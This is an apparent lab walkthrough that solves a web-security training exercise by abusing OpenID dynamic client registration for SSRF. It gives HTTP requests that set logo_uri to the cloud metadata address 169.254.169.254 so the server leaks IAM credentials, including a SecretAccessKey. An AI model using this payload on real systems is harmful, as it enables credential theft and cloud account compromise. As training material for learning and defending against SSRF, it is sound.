# SSRF-via-OpenID-dynamic-client-registration--NO-COLLABORATOR
SSRF via OpenID dynamic client registration without using collaborator

Once you log in, search for GET /auth/gQ3WYNgTizm4E43YgzNYm HTTP/2 to find your oauth server host

Step 1: Discover the OpenID Configuration (Optional but Recommended for Context)
During the login flow, intercept a request to the OAuth server's /auth endpoint. Observe parameters like client_id, redirect_uri, scope (including openid), confirming OpenID Connect usage. Send a GET request to the OAuth server's /.well-known/openid-configuration

 
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-YOUROAUTHSERVERNUMBER.oauth-server.net



Step 2: Test Basic Client Registration
In Burp Repeater, craft and send a POST request to the /reg endpoint to register a new client. No authentication is required.

POST /reg HTTP/1.1
Host: oauth-YOUROAUTHSERVERNUMBER.oauth-server.net

Content-Type: application/json

Content-Length: 63

{
    "redirect_uris": ["https://example.com"]
}

You may have to send twice for proper formatting. 

Step 4: Exploit SSRF to Access Internal Metadata

Register a new client, but set logo_uri to the internal AWS-like metadata endpoint to leak IAM credentials

POST /reg HTTP/1.1
Host: oauth-<your-oauth-server>.oauth-server.net
Content-Type: application/json
Content-Length: 156

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

You may have to send twice for formatting.
RECORD THE CLIENT_ID.

Step 5: Access the data leak

GET /client/GE_bvWcIua266T18u5vNy/logo HTTP/2
Host: oauth-0a98000a0315a19c80b40171024700cf.oauth-server.net
Content-Type: application/json 
Content-Length: 133


{ "redirect_uris": ["https://example.com"], "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/" }


The response body will contain the leaked metadata, including fields like SecretAccessKey (e.g., a string like wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY).

Step 5: Submit the Solution

Extract the SecretAccessKey value from the response.
In the lab interface, click "Submit solution" and paste the secret access key to solve the lab.


NO COLLABORATOR NEEDED.

Why this works: 
Why SSRF Works: The OAuth server blindly fetches the user-supplied logo_uri when serving the /client/<client-id>/logo endpoint, allowing access to internal resources like cloud metadata services (which are typically only accessible from localhost or internal IPs).

Firewall Note: The lab blocks external fetches in some cases, so internal URLs like 169.254.169.254 (AWS metadata IP) succeed, while arbitrary external ones may fail unless using Collaborator.

Variations: If the metadata path differs slightly, try appending or modifying it (e.g., /latest/meta-data/iam/security-credentials/admin). Ensure the redirect_uris is a valid array, as it's required.

This solves the lab by exploiting the unsafe use of client-provided data in the OAuth service.
